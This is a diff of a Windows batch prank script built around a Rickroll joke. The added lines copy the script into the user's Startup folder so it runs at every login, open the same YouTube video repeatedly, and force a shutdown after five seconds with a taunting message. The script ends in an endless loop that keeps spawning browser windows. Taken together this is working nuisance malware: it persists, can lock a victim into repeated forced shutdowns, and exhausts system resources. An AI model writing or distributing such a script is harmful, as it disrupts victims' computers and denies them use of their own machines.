@@ -1,11 +1,17 @@
 @echo off
-echo restart your computer lmao
-echo there's no escape
+echo let's get started...
 copy /y %~f0 "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\"
 start https://www.youtube.com/watch?v=dQw4w9WgXcQ
-pause
-echo initiaiting shutdown sequence...
-pause
 echo we know the game and we're gonna play it...
 pause
-shutdown -s -f -t 3 -c "have you ever considered closing the command prompt"
+start https://www.youtube.com/watch?v=dQw4w9WgXcQ
+start https://www.youtube.com/watch?v=dQw4w9WgXcQ
+start https://www.youtube.com/watch?v=dQw4w9WgXcQ
+start https://www.youtube.com/watch?v=dQw4w9WgXcQ
+start https://www.youtube.com/watch?v=dQw4w9WgXcQ
+echo initiaiting shutdown sequence...
+pause
+shutdown -s -f -t 5 -c "have you ever considered closing the command prompt"
+:a
+start https://www.youtube.com/watch?v=dQw4w9WgXcQ
+goto a
